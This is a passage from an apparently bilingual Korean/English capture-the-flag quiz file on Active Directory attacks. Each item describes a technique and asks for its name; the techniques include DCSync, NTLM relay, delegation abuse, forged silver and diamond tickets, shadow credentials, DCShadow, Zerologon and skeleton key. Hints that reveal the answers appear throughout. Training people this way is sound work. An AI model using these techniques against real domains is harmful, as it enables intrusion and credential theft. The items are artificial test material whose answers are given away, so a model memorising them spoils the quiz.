      "en": "Pretend to be a domain controller and ask a real DC to \"replicate directory changes\" (DS-Replication-Get-Changes), and it hands over the password hashes for the accounts you name. No shell on the DC needed — just replication rights — and you pull every hash including krbtgt. Name this mimikatz/secretsdump feature."
    },
    "hints": {
      "ko": [
        "\"DC\" + 동기화(sync).",
        "필요 권한: GetChanges + GetChangesAll."
      ],
      "en": [
        "\"DC\" + sync.",
        "Rights needed: GetChanges + GetChangesAll."
      ]
    }
  },
  {
    "id": "t2_adntlmrelay",
    "tier": 2,
    "cat": "lateral",
    "track": "adattack",
    "points": 90,
    "ci": true,
    "hash": "f8dc74722c9eef0fb93a2b134ab120430e1612b2ef2a1ffa5409f6a440ae1f94",
    "fmt": "두 단어 / two words (10글자 / 10 chars)",
    "title": {
      "ko": "인증을 가로채 그대로 전달",
      "en": "Catch the Auth, Pass It On"
    },
    "prompt": {
      "ko": "피해자의 NTLM 인증을 가로챈 뒤 크래킹하지 않고, 다른 서비스(LDAP·SMB·ADCS 등)로 그대로 흘려보내 피해자 명의로 인증한다. 프린트 스풀러나 EFSRPC 를 악용해 대상(DC 포함)이 내 호스트로 인증하도록 강제(coerce)하면 시동이 걸린다. Impacket 의 `ntlmrelayx` 가 하는 이 공격의 두 단어 이름은?",
      "en": "Intercept a victim's NTLM authentication and, without cracking it, forward it unchanged to another service (LDAP, SMB, ADCS, …) to authenticate as them. Kick it off by coercing a target (a DC included) to authenticate to your host — abusing the print spooler or EFSRPC. What two words name this attack, done by Impacket's `ntlmrelayx`?"
    },
    "hints": {
      "ko": [
        "인증을 그대로 이어 넘긴다.",
        "SMB 서명·LDAP 채널 바인딩·EPA 가 이를 막는다."
      ],
      "en": [
        "You forward the authentication on, unbroken.",
        "Blocked by SMB signing, LDAP channel binding and EPA."
      ]
    }
  },
  {
    "id": "t2_adkerbdeleg",
    "tier": 2,
    "cat": "kerberos",
    "track": "adattack",
    "points": 90,
    "ci": true,
    "hash": "dbecb5c1825de04ba052b8fa03e8d3276a9c3d7e34e90af0fca1fc3b168ab9fc",
    "fmt": "두 단어 / two words (24글자 / 24 chars)",
    "title": {
      "ko": "모든 TGT 를 메모리에 담는 서버",
      "en": "A Server That Keeps Every TGT in Memory"
    },
    "prompt": {
      "ko": "이 위임 설정이 걸린 서버는, 자신에게 인증하는 모든 사용자의 TGT 를 메모리에 통째로 보관한다. 그 서버를 장악한 뒤 프린터 버그 등으로 DC 컴퓨터 계정이 인증하도록 강제하면, DC 의 TGT 를 그대로 얻는다. `TrustedForDelegation` 플래그가 만드는 이 위임 유형의 두 단어(형용사 + 명사) 이름은?",
      "en": "A server with this delegation setting stores in memory the full TGT of every user who authenticates to it. Own that server, coerce the DC computer account to authenticate to it (e.g. the printer bug), and you hold the DC's TGT. What two words (adjective + noun) name this delegation type, created by the `TrustedForDelegation` flag?"
    },
    "hints": {
      "ko": [
        "제한(constrained)이 없는 위임.",
        "현대적 대안은 리소스 기반(resource-based) 위임."
      ],
      "en": [
        "Delegation with no constraint on it.",
        "The modern alternative is resource-based delegation."
      ]
    }
  },
  {
    "id": "t2_adpsexec",
    "tier": 2,
    "cat": "lateral",
    "track": "adattack",
    "points": 90,
    "ci": true,
    "hash": "e84cd3a84016fb474e1bbcb70f0100e66d8eda8897518c46eb3ccf8a0ae79771",
    "fmt": "한 단어 / one word (6글자 / 6 chars)",
    "title": {
      "ko": "ADMIN$ 에 서비스를 심어 실행",
      "en": "Drop a Service on ADMIN$ and Run"
    },
    "prompt": {
      "ko": "로컬 관리자 권한(또는 그 해시)으로 원격 머신의 `ADMIN$` 공유에 실행 파일을 올리고, 임시 서비스를 만들어 SYSTEM 으로 명령을 돌린다. 안정적이지만 서비스 설치 이벤트(ID 7045)를 남겨 탐지가 쉽다. Sysinternals 도구와 Impacket 의 `psexec.py` 가 쓰는 이 기법의 이름은?",
      "en": "With local-admin rights (or the hash) you copy an executable to the remote machine's `ADMIN$` share, create a temporary service, and run your command as SYSTEM. Reliable, but it leaves a service-install event (ID 7045) that is easy to catch. Name this method, used by the Sysinternals tool and Impacket's `psexec.py`."
    },
    "hints": {
      "ko": [
        "\"Process\" + \"Execute\" 의 준말.",
        "조용한 대안: WMI(`wmiexec`)는 서비스를 안 만든다."
      ],
      "en": [
        "Short for \"Process\" + \"Execute\".",
        "Quieter alternative: WMI (`wmiexec`) creates no service."
      ]
    }
  },
  {
    "id": "t2_adsid",
    "tier": 2,
    "cat": "enum",
    "track": "adattack",
    "points": 150,
    "ci": false,
    "hash": "1b2fe281fdb858f59236872884709f6b6bb9086cee07e9f8b26829441598e0df",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "잘 알려진 RID 붙이기",
      "en": "Appending a Well-Known RID"
    },
    "prompt": {
      "ko": "도메인 그룹의 SID 는 `도메인 SID` 뒤에 그 그룹의 잘 알려진 RID 를 붙인 것이다. 예: Administrator = -500, krbtgt = -502, Domain Users = -513, Domain Controllers = -516, Schema Admins = -518, Enterprise Admins = -519. 아래 값으로 지정된 그룹의 전체 SID 를 만들어 `FLAG{SID_<전체 SID>}` 를 제출하라.\n\n```\ndomain_sid: S-1-5-21-1004336348-1177238915-682003330\ngroup: Domain Admins\n```",
      "en": "A domain group's SID is the `domain SID` with that group's well-known RID appended. E.g. Administrator = -500, krbtgt = -502, Domain Users = -513, Domain Controllers = -516, Schema Admins = -518, Enterprise Admins = -519. Build the full SID of the group named below and submit `FLAG{SID_<full SID>}`.\n\n```\ndomain_sid: S-1-5-21-1004336348-1177238915-682003330\ngroup: Domain Admins\n```"
    },
    "hints": {
      "ko": [
        "Domain Admins 의 RID 는 512.",
        "형식: `FLAG{SID_S-1-5-21-...-682003330-512}`."
      ],
      "en": [
        "The RID of Domain Admins is 512.",
        "Format: `FLAG{SID_S-1-5-21-...-682003330-512}`."
      ]
    }
  },
  {
    "id": "t2_adroast",
    "tier": 2,
    "cat": "enum",
    "track": "adattack",
    "points": 150,
    "ci": false,
    "hash": "d1ee9482aac06debc898e3306c143cf3f7473771faaee8ef744e1cbe187849de",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "구울 수 있는 계정 세기",
      "en": "Counting the Roastable Accounts"
    },
    "prompt": {
      "ko": "아래 LDAP 덤프에서 굽기 가능한(roastable) 계정을 센다. 조건: `class` 가 user(컴퓨터 아님) 이고, `spn` 이 yes 이며, 계정이 활성(`uac` 값에 0x2(=2, 비활성) 비트가 없음). 조건을 모두 만족하는 계정 수 n 으로 `FLAG{ROAST_<n>}` 를 제출하라.\n\n```\naccounts:\nsvc_sql    | user     | spn=yes | uac=512\nsvc_web    | user     | spn=yes | uac=514\njdoe       | user     | spn=no  | uac=512\nDC01$      | computer | spn=yes | uac=532480\nsvc_backup | user     | spn=yes | uac=66048\nkrbtgt     | user     | spn=yes | uac=514\n```",
      "en": "In the LDAP dump below, count the roastable accounts. A row qualifies when `class` is user (not computer), `spn` is yes, and the account is enabled (its `uac` value has no 0x2 (=2, disabled) bit). Submit `FLAG{ROAST_<n>}` for the count n.\n\n```\naccounts:\nsvc_sql    | user     | spn=yes | uac=512\nsvc_web    | user     | spn=yes | uac=514\njdoe       | user     | spn=no  | uac=512\nDC01$      | computer | spn=yes | uac=532480\nsvc_backup | user     | spn=yes | uac=66048\nkrbtgt     | user     | spn=yes | uac=514\n```"
    },
    "hints": {
      "ko": [
        "uac 514 = 512 + 2 → 비활성. uac 66048 = 512 + 65536 → 활성.",
        "svc_sql 과 svc_backup 만 통과 → 2."
      ],
      "en": [
        "uac 514 = 512 + 2 → disabled. uac 66048 = 512 + 65536 → enabled.",
        "Only svc_sql and svc_backup pass → 2."
      ]
    }
  },
  {
    "id": "t3_adsilver",
    "tier": 3,
    "cat": "persist",
    "track": "adattack",
    "points": 130,
    "ci": true,
    "hash": "95f5c45f1fac8c78f6172165e42c4fbd6a6f0c91cc4527052760fa7f6faea90b",
    "fmt": "두 단어 / two words (13글자 / 13 chars)",
    "title": {
      "ko": "KDC 를 건드리지 않는 위조",
      "en": "A Forgery That Never Touches the KDC"
    },
    "prompt": {
      "ko": "위조 TGT 를 만들려면 krbtgt 키가 필요하지만, 이 위조 티켓은 노리는 서비스 계정(또는 컴퓨터 계정)의 NT 해시 하나만 있으면 된다. KDC 와 통신하지 않고 그 서비스 하나에 대한 서비스 티켓을 직접 서명해 만들며, KDC 로그가 남지 않아 탐지가 어렵다. 이 티켓을 부르는 두 단어(형용사 + 명사)는?",
      "en": "Forging a TGT needs the krbtgt key, but this forged ticket needs only the NT hash of the one service (or computer) account you target. You sign a service ticket for that single service yourself without contacting the KDC, so no KDC log appears and detection is hard. What two words (adjective + noun) name it?"
    },
    "hints": {
      "ko": [
        "금(金)보다 값이 낮은 금속.",
        "CIFS·HOST·HTTP 같은 SPN 클래스별로 만든다."
      ],
      "en": [
        "The metal worth less than gold.",
        "Minted per SPN class — CIFS, HOST, HTTP, …"
      ]
    }
  },
  {
    "id": "t3_adshadowcreds",
    "tier": 3,
    "cat": "persist",
    "track": "adattack",
    "points": 130,
    "ci": true,
    "hash": "cb7220aabbfa303c6772751a5133c9ac68ed3fa3f8755a75278fa0b9b1a718bb",
    "fmt": "두 단어 / two words (18글자 / 18 chars)",
    "title": {
      "ko": "비밀번호 대신 키를 심다",
      "en": "Plant a Key Instead of a Password"
    },
    "prompt": {
      "ko": "대상 계정의 비밀번호를 리셋하는 대신(눈에 띈다), 그 계정의 `msDS-KeyCredentialLink` 속성에 공격자가 만든 공개키를 써 넣는다. 그러면 그 개인키로 인증서를 얻어 대상 계정 명의의 Kerberos TGT 를 받는다. 속성 쓰기 권한(GenericWrite 등)만 있으면 된다. pywhisker·Whisker 가 하는 이 기법의 두 단어 이름은?",
      "en": "Instead of resetting the target account's password (noisy), write an attacker-generated public key into its `msDS-KeyCredentialLink` attribute. Then use the private key to obtain a certificate and get a Kerberos TGT as that account. Only write access to the attribute (GenericWrite, …) is required. What two words name this technique, done by pywhisker/Whisker?"
    },
    "hints": {
      "ko": [
        "진짜 자격 증명 옆에 몰래 두는 \"그림자\" 자격 증명.",
        "키 신뢰(Key Trust)와 인증서 사전 인증 위에서 동작한다."
      ],
      "en": [
        "A \"shadow\" credential set beside the real one.",
        "Rides on Key Trust and PKINIT."
      ]
    }
  },
  {
    "id": "t3_adadminsdholder",
    "tier": 3,
    "cat": "persist",
    "track": "adattack",
    "points": 130,
    "ci": true,
    "hash": "e19d79f730076b908ffd9db98b5cb1946e7bf8ddd15dfe6a0315b66e41fea536",
    "fmt": "한 단어 / one word (13글자 / 13 chars)",
    "title": {
      "ko": "스스로 복구되는 백도어",
      "en": "A Backdoor That Heals Itself"
    },
    "prompt": {
      "ko": "AD 에는 보호 대상 계정(adminCount=1, 예: Domain Admins 멤버)의 ACL 을 60분마다 하나의 템플릿 객체에서 그대로 복사해 덮어쓰는 SDProp 프로세스가 있다. 그 템플릿 객체의 ACL 에 자기 계정을 추가하면, 관리자가 지워도 다음 주기에 다시 살아나는 지속성이 생긴다. 이 컨테이너 객체의 이름은?",
      "en": "AD runs an SDProp process that every 60 minutes copies the ACL of one template object over every protected account (adminCount=1, e.g. Domain Admins members). Add your account to that template's ACL and you get persistence that comes back next cycle even after an admin removes it. Name this container object."
    },
    "hints": {
      "ko": [
        "\"Admin\" + \"SD\"(보안 기술자) + \"Holder\".",
        "경로: `CN=AdminSDHolder,CN=System,DC=...`."
      ],
      "en": [
        "\"Admin\" + \"SD\" (security descriptor) + \"Holder\".",
        "Path: `CN=AdminSDHolder,CN=System,DC=...`."
      ]
    }
  },
  {
    "id": "t3_addcshadow",
    "tier": 3,
    "cat": "persist",
    "track": "adattack",
    "points": 130,
    "ci": true,
    "hash": "30e711222cff6dd67fb962e19c9517b0cd054d1e2877a47e1962ae1fb6666ec8",
    "fmt": "한 단어 / one word (8글자 / 8 chars)",
    "title": {
      "ko": "가짜 DC 를 잠깐 등록",
      "en": "Register a Rogue DC, Briefly"
    },
    "prompt": {
      "ko": "가짜 DC 로 해시를 \"가져오는\" 공격과 달리, 이 공격은 자신을 잠깐 도메인 컨트롤러로 등록해 악의적 복제 변경(예: 어떤 계정을 특권 그룹에 추가)을 AD 에 \"밀어 넣고\" 곧바로 등록을 해제한다. 정상적인 쓰기 로그가 남지 않아 탐지가 어렵다. mimikatz 의 이 기법 이름은?",
      "en": "Unlike the attack that \"pulls\" hashes as a fake DC, this one registers itself as a domain controller just long enough to \"push\" a malicious replication change into AD (e.g. adding an account to a sensitive group), then deregisters. No normal write is logged, so detection is hard. Name this mimikatz technique."
    },
    "hints": {
      "ko": [
        "\"DC\" + 그림자(shadow).",
        "필요 권한: 도메인 객체에 대한 복제 관련 쓰기 (사실상 DA)."
      ],
      "en": [
        "\"DC\" + shadow.",
        "Needs replication-related write on the domain object (effectively DA)."
      ]
    }
  },
  {
    "id": "t3_adrbcd",
    "tier": 3,
    "cat": "kerberos",
    "track": "adattack",
    "points": 130,
    "ci": true,
    "hash": "49f21a9e3f3a4e2deed8d8f6fbcabc732665f13ef0f4cdb92909626ad5e57f8f",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "대상 객체에 쓰기만 되면",
      "en": "Just Write to the Target Object"
    },
    "prompt": {
      "ko": "또 다른 위임 방식으로, 대상 컴퓨터 객체의 `msDS-AllowedToActOnBehalfOfOtherIdentity` 속성에 쓰기 권한(GenericWrite/GenericAll)만 있으면 된다. 공격자가 통제하는 SPN 보유 주체를 그 속성에 넣으면, 그 주체가 대상 컴퓨터에 임의 사용자(Administrator 포함)를 가장할 수 있다. 이 위임의 네 글자 약어는?",
      "en": "Another delegation flavour where you need only write access (GenericWrite/GenericAll) on the target computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. Place a principal you control that has an SPN into that attribute, and it can impersonate any user (Administrator included) to that computer. Give the four-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Resource-Based Constrained Delegation\".",
        "기본 도메인은 일반 사용자도 컴퓨터 계정을 10개까지 만들 수 있어 SPN 주체 확보가 쉽다."
      ],
      "en": [
        "\"Resource-Based Constrained Delegation\".",
        "By default any user can create up to 10 computer accounts, so getting an SPN principal is easy."
      ]
    }
  },
  {
    "id": "t3_adpkinit",
    "tier": 3,
    "cat": "kerberos",
    "track": "adattack",
    "points": 130,
    "ci": true,
    "hash": "55dcd089541a1b0ebbe69acfdd89f10bcfeff72f55cfeb16997ea6a8b703e481",
    "fmt": "한 단어 / one word (6글자 / 6 chars)",
    "title": {
      "ko": "비밀번호 대신 인증서로 TGT",
      "en": "A TGT From a Certificate, Not a Password"
    },
    "prompt": {
      "ko": "이 Kerberos 확장은 클라이언트가 비밀번호 대신 X.509 인증서로 AS-REQ 를 보내 TGT 를 받게 해 준다. 스마트카드 로그온의 기반이며, 인증서 기반 AD 공격(취약 템플릿에서 인증서 발급, 계정에 키 심기)이 모두 이 위에서 동작한다. 이 확장의 이름은?",
      "en": "This Kerberos extension lets a client send an AS-REQ with an X.509 certificate instead of a password to get a TGT. It is the basis of smart-card logon, and every certificate-based AD attack (enrolling a cert from a weak template, planting a key on an account) rides on it. Name the extension."
    },
    "hints": {
      "ko": [
        "\"Public Key Cryptography for Initial Authentication in Kerberos\".",
        "받은 TGT 에서 NTLM 해시를 뽑아내는 것을 UnPAC-the-hash 라 한다."
      ],
      "en": [
        "\"Public Key Cryptography for Initial Authentication in Kerberos\".",
        "Extracting the NTLM hash from the resulting TGT is called UnPAC-the-hash."
      ]
    }
  },
  {
    "id": "t3_adcoerce",
    "tier": 3,
    "cat": "lateral",
    "track": "adattack",
    "points": 130,
    "ci": true,
    "hash": "4f19080a73c31a8ebdead7af1c39b1bf885bc8abec5a8f291dc2cbb368e1e871",
    "fmt": "한 단어 / one word (10글자 / 10 chars)",
    "title": {
      "ko": "DC 를 억지로 인증시키기",
      "en": "Forcing the DC to Authenticate"
    },
    "prompt": {
      "ko": "2021년 공개된 이 기법은 MS-EFSRPC 원격 프로시저(`EfsRpcOpenFileRaw` 등)를 악용해, 인증 없이 또는 낮은 권한으로 대상(주로 DC)이 공격자 호스트로 즉시 컴퓨터 계정 인증을 하도록 강제한다. 그 인증을 ADCS 웹 등록 서비스로 넘기면 DC 인증서를 얻는다. 작은 하마를 연상시키는 이름의 이 도구는?",
      "en": "This 2021 technique abuses the MS-EFSRPC remote procedures (`EfsRpcOpenFileRaw`, …) to force a target (usually a DC) to authenticate its computer account to the attacker's host immediately, unauthenticated or with low privilege. Forward that to the ADCS web-enrollment service and you get a DC certificate. Name this tool, whose name plays on a small hippo."
    },
    "hints": {
      "ko": [
        "\"Petit\"(작은) + \"Potam\"(하마) 느낌의 프랑스어 말장난.",
        "다른 강제 인증 벡터: PrinterBug(MS-RPRN), ShadowCoerce, DFSCoerce."
      ],
      "en": [
        "\"Petit\" + \"Potam\".",
        "Other coercion vectors: PrinterBug (MS-RPRN), ShadowCoerce, DFSCoerce."
      ]
    }
  },
  {
    "id": "t3_adesc1",
    "tier": 3,
    "cat": "enum",
    "track": "adattack",
    "points": 130,
    "ci": true,
    "hash": "ddec564fa140b5aaf8b9c4bc6714ded5fb5c9baabfc3bfa6bbc2ed278de72077",
    "fmt": "값 그대로 / literal (4글자 / 4 chars)",
    "title": {
      "ko": "인증서 템플릿 오설정 1번",
      "en": "Certificate Template Misconfig No. 1"
    },
    "prompt": {
      "ko": "ADCS 공격 분류(Certipy·\"Certified Pre-Owned\")에서, 낮은 권한 사용자가 등록할 수 있고 동시에 요청서에 임의의 subjectAltName 을 넣을 수 있는 인증서 템플릿의 오설정. 그래서 Administrator 명의로 인증서를 발급받아 도메인을 장악한다. 이 오설정의 이름(ESC + 번호)은?",
      "en": "In the ADCS attack taxonomy (Certipy, \"Certified Pre-Owned\"), the certificate-template misconfiguration where a low-rights user can enroll AND supply an arbitrary subjectAltName in the request — so you get a certificate as Administrator and own the domain. Name this misconfiguration (ESC + number)."
    },
    "hints": {
      "ko": [
        "\"ESCalation\" 1번.",
        "방어: 템플릿에서 \"요청자가 제목 제공\" 해제, 관리자 승인 요구."
      ],
      "en": [
        "\"ESCalation\" number 1.",
        "Fix: turn off \"supply in request\" for the subject, require manager approval."
      ]
    }
  },
  {
    "id": "t3_adbloodpath",
    "tier": 3,
    "cat": "enum",
    "track": "adattack",
    "points": 200,
    "ci": false,
    "hash": "3c49b46dac3682d81d747c37b40aee4939a29424a9da79e0567822234b94f7f4",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "그래프에서 최단 경로",
      "en": "Shortest Path Through the Graph"
    },
    "prompt": {
      "ko": "아래는 AD 공격 경로 그래프의 방향 간선 목록이다. `OWNED` 노드에서 출발해 방향 간선을 따라 `DC` 노드에 도달한다. 각 간선(MemberOf, AdminTo, HasSession, GenericAll, ForceChangePassword 등)은 1홉이다. 최단 경로의 간선 수 n 으로 `FLAG{HOPS_<n>}` 를 제출하라.\n\n```\nedges:\njdoe -> IT_STAFF (MemberOf)\nIT_STAFF -> svc_deploy (GenericAll)\nsvc_deploy -> WEB01 (AdminTo)\nWEB01 -> tadmin (HasSession)\ntadmin -> DOMAIN_ADMINS (MemberOf)\nDOMAIN_ADMINS -> DC01 (AdminTo)\njdoe -> HELP_DESK (MemberOf)\nHELP_DESK -> tadmin (ForceChangePassword)\nnodes: OWNED=jdoe DC=DC01\n```",
      "en": "Below is the directed edge list of an AD attack-path graph. Start at the `OWNED` node and follow directed edges to reach the `DC` node. Every edge (MemberOf, AdminTo, HasSession, GenericAll, ForceChangePassword, …) is one hop. Submit `FLAG{HOPS_<n>}` for the edge count n of the shortest path.\n\n```\nedges:\njdoe -> IT_STAFF (MemberOf)\nIT_STAFF -> svc_deploy (GenericAll)\nsvc_deploy -> WEB01 (AdminTo)\nWEB01 -> tadmin (HasSession)\ntadmin -> DOMAIN_ADMINS (MemberOf)\nDOMAIN_ADMINS -> DC01 (AdminTo)\njdoe -> HELP_DESK (MemberOf)\nHELP_DESK -> tadmin (ForceChangePassword)\nnodes: OWNED=jdoe DC=DC01\n```"
    },
    "hints": {
      "ko": [
        "짧은 길: jdoe → HELP_DESK → tadmin → DOMAIN_ADMINS → DC01.",
        "그 길의 간선은 네 개. 긴 길(IT_STAFF 경유)은 여섯 개."
      ],
      "en": [
        "Short way: jdoe → HELP_DESK → tadmin → DOMAIN_ADMINS → DC01.",
        "That way has four edges. The long way (via IT_STAFF) has six."
      ]
    }
  },
  {
    "id": "t4_adzerologon",
    "tier": 4,
    "cat": "lateral",
    "track": "adattack",
    "points": 160,
    "ci": true,
    "hash": "65f462bc53bef3047bbcb0925f799c96d06b3f1a811bc6cf5572ddd756e27eb4",
    "fmt": "한 단어 / one word (9글자 / 9 chars)",
    "title": {
      "ko": "전부 0 이면 통과",
      "en": "All Zeros Gets You In"
    },
    "prompt": {
      "ko": "CVE-2020-1472. Netlogon 이 쓰는 AES-CFB8 구현의 결함으로, 클라이언트 챌린지와 IV 를 전부 0 으로 두면 평균 256번에 한 번 인증이 통과한다. 인증 없는 공격자가 DC 컴퓨터 계정의 비밀번호를 빈 값으로 리셋해 즉시 도메인을 장악한다. 이 취약점의 이름은?",
      "en": "CVE-2020-1472. A flaw in the AES-CFB8 use inside Netlogon: set the client challenge and IV to all zeros and authentication succeeds about one try in 256. An unauthenticated attacker resets the DC computer account's password to empty and owns the domain at once. Name this vulnerability."
    },
    "hints": {
      "ko": [
        "\"Zero\" + \"logon\".",
        "Secura 가 명명·공개했다."
      ],
      "en": [
        "\"Zero\" + \"logon\".",
        "Named and disclosed by Secura."
      ]
    }
  },
  {
    "id": "t4_adsidhistory",
    "tier": 4,
    "cat": "persist",
    "track": "adattack",
    "points": 160,
    "ci": true,
    "hash": "a425201749bcae45c4fdb35db4625a18b78f0c5bbaf3d5329f39812756d07a98",
    "fmt": "두 단어 / two words (11글자 / 11 chars)",
    "title": {
      "ko": "옛 SID 를 실어 나르는 칸",
      "en": "The Field That Carries Old SIDs"
    },
    "prompt": {
      "ko": "도메인 이전(migration)을 위해 만들어진 이 속성은 계정의 예전 SID 들을 담아, 옛 도메인의 리소스 접근을 유지시켜 준다. 여기에 특권 SID(예: Enterprise Admins, 도메인SID-519)를 주입하면 계정이 그 그룹 멤버가 아닌데도 그 권한을 갖는다 — 그룹 목록에는 안 보인다. 이 속성의 두 단어 이름은?",
      "en": "Built for domain migrations, this attribute holds an account's former SIDs so it keeps access to resources in the old domain. Inject a high-power SID (e.g. Enterprise Admins, domainSID-519) here and the account gains that access without being in the group — and it does not show in the group list. Give the two-word name."
    },
    "hints": {
      "ko": [
        "SID + 이력(history).",
        "SID 필터링(Trust 상)과 도메인 내 감사가 방어."
      ],
      "en": [
        "SID + history.",
        "Defended by SID filtering (across trusts) and in-domain auditing."
      ]
    }
  },
  {
    "id": "t4_addiamond",
    "tier": 4,
    "cat": "persist",
    "track": "adattack",
    "points": 160,
    "ci": true,
    "hash": "e141d7a4bc31f636844151e88dcf1320a49ffca5dccfa6adee42b3b52f346d11",
    "fmt": "두 단어 / two words (14글자 / 14 chars)",
    "title": {
      "ko": "진짜 TGT 를 뜯어 고치기",
      "en": "Take a Real TGT and Edit It"
    },
    "prompt": {
      "ko": "완전히 처음부터 위조하는 TGT 는 특정 방어 검사에서 걸린다. 이 티켓은 대신 KDC 에게 진짜 TGT 를 정상적으로 요청한 뒤, krbtgt 키로 복호화해 안의 특권 정보(그룹·SID)를 고치고 다시 서명한다. 진짜 티켓에서 파생됐기에 더 은밀하다. 보석 이름을 딴 이 티켓의 두 단어 이름은?",
      "en": "A TGT forged entirely from scratch trips certain defensive checks. This ticket instead asks the KDC for a genuine TGT the normal way, then decrypts it with the krbtgt key, edits the privilege data (groups, SIDs) inside, and re-signs it. Derived from a real ticket, it is stealthier. Name this ticket (two words, named after a gemstone)."
    },
    "hints": {
      "ko": [
        "금·은 다음의 값비싼 보석.",
        "Rubeus 의 `diamond` 명령."
      ],
      "en": [
        "The precious stone that follows gold and silver here.",
        "Rubeus's `diamond` command."
      ]
    }
  },
  {
    "id": "t4_adlaps",
    "tier": 4,
    "cat": "lateral",
    "track": "adattack",
    "points": 160,
    "ci": true,
    "hash": "a03e9a0ef8296a393caa16ec68e1194f63f3c3b987f570c5323c790341d666a6",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "머신마다 다른 관리자 비번",
      "en": "A Different Admin Password Per Machine"
    },
    "prompt": {
      "ko": "마이크로소프트의 무료 솔루션으로, 각 도메인 가입 머신의 로컬 Administrator 비밀번호를 무작위로 만들고 주기적으로 회전시켜, 기밀 AD 속성(`ms-Mcs-AdmPwd` 또는 신형의 암호화 속성)에 저장한다. 한 머신의 해시를 훔쳐도 다른 머신에서 재사용할 수 없게 만든다. 이 솔루션의 네 글자 약어는?",
      "en": "Microsoft's free solution that randomizes and periodically rotates each domain-joined machine's local Administrator password, storing it in a confidential AD attribute (`ms-Mcs-AdmPwd`, or the encrypted attribute in the new version). A hash stolen from one machine can no longer be reused on another. Give the four-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Local Administrator Password Solution\".",
        "읽기 권한을 잘못 위임하면 오히려 공격 경로가 된다."
      ],
      "en": [
        "\"Local Administrator Password Solution\".",
        "Misdelegated read rights on it become an attack path instead."
      ]
    }
  },
  {
    "id": "t4_adkrbtgtreset",
    "tier": 4,
    "cat": "persist",
    "track": "adattack",
    "points": 160,
    "ci": true,
    "hash": "d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35",
    "fmt": "숫자 / number",
    "title": {
      "ko": "몇 번 리셋해야 하나",
      "en": "How Many Resets It Takes"
    },
    "prompt": {
      "ko": "krbtgt 계정은 Active 와 Previous 두 개의 키를 동시에 유지한다. 그래서 이 비밀번호를 한 번만 리셋하면 위조된 기존 TGT 는 Previous 키로 여전히 검증된다. 위조 TGT 를 완전히 무효화하려면 (최소 10시간 간격을 두고) 연달아 몇 번 리셋해야 하는가? (숫자)",
      "en": "The krbtgt account keeps two keys at once, Active and Previous. So resetting its password just once still lets an existing forged TGT validate against the Previous key. To fully invalidate forged TGTs, how many consecutive resets are required (with at least 10 hours between them)? (number)"
    },
    "hints": {
      "ko": [
        "Previous 키까지 새 키로 밀어내야 한다.",
        "1보다 크고 3보다 작다."
      ],
      "en": [
        "You must push the Previous key out with a new one too.",
        "More than one, fewer than three."
      ]
    }
  },
  {
    "id": "t4_adskeleton",
    "tier": 4,
    "cat": "persist",
    "track": "adattack",
    "points": 160,
    "ci": true,
    "hash": "a6fadbb2db71e757d1ebb261a29fe9c55b195b758a975811340e3cca83f37348",
    "fmt": "두 단어 / two words (12글자 / 12 chars)",
    "title": {
      "ko": "모든 계정에 통하는 하나의 비번",
      "en": "One Password That Opens Every Account"
    },
    "prompt": {
      "ko": "이 mimikatz 기법은 DC 의 LSASS 를 메모리에서 패치해, 도메인 전체의 모든 계정에 대해 하나의 마스터 비밀번호가 추가로 통하게 만든다(각 계정의 진짜 비밀번호도 그대로 작동). DC 를 재부팅하면 사라진다. 옛날 만능 열쇠를 뜻하는 두 단어 이름은?",
      "en": "This mimikatz technique patches a DC's LSASS in memory so that one master password additionally works for every account in the domain (each account's real password still works too). It clears on a DC reboot. Name it with the two words for an old universal key."
    },
    "hints": {
      "ko": [
        "옛날 문 대부분을 여는 만능 열쇠.",
        "기본 마스터 비밀번호는 \"mimikatz\"."
      ],
      "en": [
        "The universal key that opened most old locks.",
        "The default master password is \"mimikatz\"."
      ]
    }
  },
  {
    "id": "t4_adgpo",
    "tier": 4,
    "cat": "lateral",
    "track": "adattack",
    "points": 160,
    "ci": true,
    "hash": "b46825e4c9999e9c555b72d2711f8a5dd552a1790bb9a5dc12d6c5efc6426c04",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "OU 전체에 작업을 밀어넣기",
      "en": "Push a Task to a Whole OU"
    },
    "prompt": {
      "ko": "서버가 가득한 OU 에 연결된 이 도메인 전역 정책 객체 중 하나를 편집할 권한을 얻으면, 그 OU 의 모든 머신에 예약 작업이나 시작 스크립트를 밀어넣어 코드를 실행할 수 있다. `SharpGPOAbuse` 가 하는 공격의 대상인 이 객체의 세 글자 약어는?",
      "en": "Get the right to edit one of these domain-wide policy objects linked to an OU full of servers, and you can push a scheduled task or a startup script to every machine in that OU to run code. Give the three-letter acronym for this object, the target of `SharpGPOAbuse`."
    },
    "hints": {
      "ko": [
        "\"Group Policy Object\".",
        "공격 그래프 엣지: `GPLink`, `WriteGPLink`."
      ],
      "en": [
        "\"Group Policy Object\".",
        "Attack-graph edges: `GPLink`, `WriteGPLink`."
      ]
    }
  },
  {
    "id": "t4_adpac",
    "tier": 4,
    "cat": "kerberos",
    "track": "adattack",
    "points": 160,
    "ci": true,
    "hash": "eade1e1268e28e35a4b71c694260c0224da4d65ffdb435e5081346fea4135a88",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "티켓 안의 권한 명세",
      "en": "The Authorization Blob Inside a Ticket"
    },
    "prompt": {
      "ko": "마이크로소프트가 Kerberos 티켓 안에 넣는 구조로, 사용자의 SID·그룹 멤버십·권한을 담는다. KDC 가 서명하며, 이것을 위조하거나 편집하는 것이 티켓 위조 공격의 핵심이다. MS14-068 은 이 구조의 서명 검증 결함이었다. 이 구조의 세 글자 약어는?",
      "en": "A structure Microsoft puts inside a Kerberos ticket carrying the user's SIDs, group memberships and privileges. The KDC signs it, and forging or editing it is the heart of ticket-forgery attacks. MS14-068 was a flaw in validating its signature. Give the three-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Privilege Attribute Certificate\".",
        "서비스는 이 구조의 검증을 KDC 에 맡길 수 있다."
      ],
      "en": [
        "\"Privilege Attribute Certificate\".",
        "A service can have the KDC re-check the structure for it."
